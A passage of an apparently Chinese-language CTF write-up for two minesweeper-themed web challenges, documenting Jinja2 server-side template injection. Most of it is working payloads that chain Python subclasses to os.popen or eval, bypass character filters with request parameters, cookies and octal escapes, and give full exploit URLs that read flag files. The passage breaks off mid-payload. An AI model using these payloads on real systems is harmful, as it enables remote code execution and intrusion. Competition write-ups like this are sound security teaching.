+<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">144</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'sleep 2333'</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"strings /etc/issue"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 总而言之是有很多的。。。</span></code></pre>
+
+<pre><code>     不过这个题目过滤了不少东西，比如：单引号 `&#39;` ，双引号 `&quot;`，下划线 &#39;`_`&#39;， 方框 `[` 和 `]`，等等，不过这里问题是不大的，比如这里用如下的payload为例进行bypass：
+</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"strings /etc/issue"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>​        这里过滤了单引号 <code>&#39;</code> ，和双引号 <code>&quot;</code> ，就不能够使用一些如 <strong>16进制</strong> 、<strong>8进制 <strong>的方法绕过形如 “</strong>_</strong>“ 的字符了，不过可以使用一些新的姿势来从别的地方引入字符。</p>
+<p>​        比如可以从请求内容入手：</p>
+<pre class="language-python" data-language="python"><code class="language-python">request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get
+request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get
+request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get
+request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get
+request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get
+request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get
+<span class="token comment">#等等</span></code></pre>
+
+<p>​        不过有些给ban了，比如说 <code>form</code> <code>agrs</code> <code>headers</code> <code>json</code>，这里可以用 <code>request.cookie.get</code> 或者 <code>request.values.get</code> 来获取传参的内容作为字符串。只是还有一个问题需要解决，就是如何传入指定键名的参数。可以用以下语句来获取单个字符作为键名：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span>?<span class="token punctuation">)</span></code></pre>
+
+<ul>
+<li><p>其中 dict|string 可以得到 <code>&lt;type &#39;dict&#39;&gt;</code> 这个字符串</p>
+</li>
+<li><p>而 dict|string|list 可以得到关于上述字符串的列表 <code>[u&#39;&lt;&#39;, u&#39;t&#39;, u&#39;y&#39;, u&#39;p&#39;, u&#39;e&#39;, u&#39; &#39;, u&quot;&#39;&quot;, u&#39;d&#39;, u&#39;i&#39;, u&#39;c&#39;, u&#39;t&#39;, u&quot;&#39;&quot;, u&#39;&gt;&#39;]</code></p>
+</li>
+<li><p>由于点 ‘.’ 没被过滤，那么就可以使用 <code>(dict|string|list).pop(?)</code> 这个语句获取字符串列表的第 <code>?</code> 个值。</p>
+<ul>
+<li>比如 <code>(dict|string|list).pop(0)</code> 的值为 <code>&lt;</code></li>
+</ul>
+<p>通过以上的组合就可以取得到一些特定的键名了，这里比如可以组合成以下的payload：</p>
+</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python">?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span><span class="token operator">&lt;=</span>tql</code></pre>
+
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/23/FrMxTIJeXwgRYcW.png" alt="image-20201221181007048.png" loading="lazy"></p>
+</blockquote>
+<p>​        现在就可以构造任意字符串了，不过至多只能构造 <code>12</code> 个字符（<code>&lt;type &#39;dict&#39;&gt;</code> 只有12个字符是不同的），其实也基本上是够用的了。</p>
+<p>（这里要吐糟一下这个玩意，POST请求会405，显然是只能通过GET传参了！</p>
+<p>​        然后形如 <strong>‘()._<em>class_</em>‘</strong> 可以使用 <code>attr</code> 以及上边所说的 <code>任意传参</code> 来进行绕过，比如 <code>().__class__</code>：</p>
+<pre class="language-python" data-language="python"><code class="language-python">?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span><span class="token operator">&lt;=</span>__class__</code></pre>
+
+<pre><code>     那么**&#39;[&#39;** **&#39;]&#39;**  这个可以用 **\_\_getitem\_\_** 来绕过，那么payload可以这样拼：
+</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 需要拼成的payload</span>
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"strings /etc/issue"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 拼接伪格式</span>
+<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>`<span class="token operator">&lt;</span>`__class__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>`t`__base__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>`y`__subclasses__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>`p`__getitem__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>`e`__init__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>`<span class="token operator">%</span><span class="token number">20</span>`func_globals<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>`<span class="token operator">%</span><span class="token number">27</span>`RCE<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 最终payload</span>
+http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">121.37</span><span class="token number">.160</span><span class="token number">.91</span><span class="token punctuation">:</span><span class="token number">30715</span><span class="token operator">/</span>success?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">3C</span><span class="token operator">=</span>__class__<span class="token operator">&amp;</span>t<span class="token operator">=</span>__base__<span class="token operator">&amp;</span>y<span class="token operator">=</span>__subclasses__<span class="token operator">&amp;</span>p<span class="token operator">=</span>__getitem__<span class="token operator">&amp;</span>e<span class="token operator">=</span>__init__<span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">=</span>func_globals<span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">=</span><span class="token builtin">id</span></code></pre>
+
+<p>​        执行了命令：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/tBCJpKo3Nbjeua6.png" alt="image-20201221183634816.png" loading="lazy"></p>
+</blockquote>
+<p>​        最后直接 <code>cat flag.txt</code> 就好啦：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/6HFTejiayWbg2vB.png" alt="image-20201221183804897.png" loading="lazy"></p>
+</blockquote>
+<p>​        那么最终的payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">121.37</span><span class="token number">.160</span><span class="token number">.91</span><span class="token punctuation">:</span><span class="token number">30715</span><span class="token operator">/</span>success?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">3C</span><span class="token operator">=</span>__class__<span class="token operator">&amp;</span>t<span class="token operator">=</span>__base__<span class="token operator">&amp;</span>y<span class="token operator">=</span>__subclasses__<span class="token operator">&amp;</span>p<span class="token operator">=</span>__getitem__<span class="token operator">&amp;</span>e<span class="token operator">=</span>__init__<span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">=</span>func_globals<span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">=</span>cat flag<span class="token punctuation">.</span>txt</code></pre>
+
+<p>​        当然，如果用 <code>request.cookie.get</code> 也是阔以的：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/H7KuiVyCxb1rZ2s.png" alt="image-20201221184032827.png" loading="lazy"></p>
+</blockquote>
+<p>​        使用 <code>request.cookie.get</code> 的payload：</p>
+<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">GET</span> /success?msg=&#123;&#123;()|attr(request.cookies.get((()|select|string|list).pop(1)))|attr(request.cookies.get((()|select|string|list).pop(2)))|attr(request.cookies.get((()|select|string|list).pop(3)))(0)|attr(request.cookies.get((()|select|string|list).pop(5)))()|attr(request.cookies.get((()|select|string|list).pop(3)))(60)|attr(request.cookies.get((()|select|string|list).pop(6)))|attr(request.cookies.get((()|select|string|list).pop(7)))|attr(request.cookies.get((()|select|string|list).pop(3)))(request.cookies.get((()|select|string|list).pop(8)))|attr(request.cookies.get((()|select|string|list).pop(3)))(request.cookies.get((()|select|string|list).pop(12)))(request.cookies.get((()|select|string|list).pop(13)))&#125;&#125; HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> 121.37.160.91:30715
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="token header-name keyword">Cookie:</span>g=__class__;e=__bases__;n=__getitem__;r=__subclasses__;a=__init__;t=__globals__;o=__builtins__;b=eval;j=__import__('os').popen('cat /app/flag.txt').read()
+<span class="token header-name keyword">Connection:</span> close
+<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1
+
+</code></pre>
+
+<p>​        不过由于没有过滤 点 **.**，实际上 <strong>_<em>getitem</em>_</strong> 这个是可以完全没必要的，直接 <code>.pop(?)</code> 就阔以了，懒得改了。</p>
+<p>​        得到flag：<code>flag&#123;cfc5f0d39588fb2129dae9b28edea6e9&#125;</code></p>
+<pre class="language-none"><code class="language-none">flag&#123;cfc5f0d39588fb2129dae9b28edea6e9&#125;</code></pre>
+
+<p>​        后话：</p>
+<p>​                没过滤点 <strong>.</strong> ，可以用 <code>.pop(?)</code> 来代替 <strong>_<em>getitem</em>_</strong> ，然后关于从<strong>GET</strong>传参可以用以下的payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">121.37</span><span class="token number">.160</span><span class="token number">.91</span><span class="token punctuation">:</span><span class="token number">30715</span><span class="token operator">/</span>success?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x2<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x4<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>linecache<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x6<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>x1<span class="token operator">=</span>__class__<span class="token operator">&amp;</span>x2<span class="token operator">=</span>__base__<span class="token operator">&amp;</span>x3<span class="token operator">=</span>__subclasses__<span class="token operator">&amp;</span>x4<span class="token operator">=</span>__init__<span class="token operator">&amp;</span>x5<span class="token operator">=</span>func_globals<span class="token operator">&amp;</span>x6<span class="token operator">=</span>cat flag<span class="token punctuation">.</span>txt</code></pre>
+
+<p>​                我 👈 太 👎 了。</p>
+<hr>
+<h4 id="MINE2"><a href="#MINE2" class="headerlink" title="MINE2"></a>MINE2</h4><p>​        啊，这个扫雷可比之前那个扫雷困难多了。真的是越来越嚣张了这玩意，反正队里的扫雷大佬也觉得不如直接看源码了，直接F12看了下跳转的页面，发现还是和扫雷1是一样的：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/GuQBK4qtJdzxe9A.png" alt="image-20201221185404018.png" loading="lazy"></p>
+</blockquote>
+<p>​        还是老样子的 <strong>SSTI</strong> ，先看一下发现是 <code>python3.6.12</code>：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/w9td1ZPuBeS6fMs.png" alt="image-20201221185648203.png" loading="lazy"></p>
+</blockquote>
+<p>​        简单的fuzz一下，发现过滤 点 <code>.</code> ，双花括号 <code>&#123;&#123;` 和 `&#125;&#125;</code>，下划线 <code>_</code> ，单引号 <code>&#39;</code>，字母 <code>g</code> 和 <code>u</code> 等等。不过没有过滤双引号 <code>&quot;</code>，这可就简单多了。因为可以使用双引号加上 <strong>16进制</strong> 或 <strong>8进制</strong> 字符来绕过一些过滤。</p>
+<p>​        这里可以用 <code>&#123;%print(2333)%&#125;</code> 就可以逃逸出去了：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/caRiBVQ4OnueyZf.png" alt="image-20201221192640780.png" loading="lazy"></p>
+</blockquote>
+<p>​        这题太简单了，直接随便找个 <strong>python3</strong> 的 <strong>SSTI</strong> 的 <strong>rce</strong> 的payload就行了：</p>
+<p>​        在 <strong>python3</strong> 的 <strong>SSTI</strong> 的 <strong>rce</strong> 的 payload中，一个公式据说，<code>3.7:103 default:80</code>，意思是，在 <strong>python3.6</strong> ~ <strong>python3.9</strong>中，除了<strong>python3.7</strong>，以下payload都是通用的：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># python3.6 ~ python3.9，除了python3.7</span>
+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls').read()"</span><span class="token punctuation">)</span></code></pre>
+
+<p>​        然后在 <strong>python3.7</strong> 中，<strong>80</strong>得改成<strong>103</strong>：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls').read()"</span><span class="token punctuation">)</span></code></pre>
+
+<p>​        开始绕（这里使用 <strong>8进制</strong> 和 <strong>16进制</strong> 表示字符）：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 需要拼成的payload</span>
+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('ls').read()"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 拼接伪格式</span>
+<span class="token string">""</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__class__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__mro__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__getitem__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__subclasses__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__getitem__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__init__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__globals__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__getitem__<span class="token punctuation">)</span><span class="token punctuation">(</span>__builtins__<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>__getitem__<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">)</span><span class="token punctuation">(</span>CMD<span class="token punctuation">)</span>
+
+<span class="token comment"># 最终payload</span>
+http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">124.71</span><span class="token number">.205</span><span class="token number">.79</span><span class="token punctuation">:</span><span class="token number">32525</span><span class="token operator">/</span>success?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\137\137class\137\137"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\137\137mro\137\137"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>"\<span class="token number">13</span>
+<span class="token number">7</span>\<span class="token number">137</span>\147etitem\<span class="token number">137</span>\<span class="token number">137</span><span class="token string">")(-1)|attr("</span>\<span class="token number">137</span>\137s\165bclasses\<span class="token number">137</span>\<span class="token number">137</span>"<span class="token punctuation">)</span>
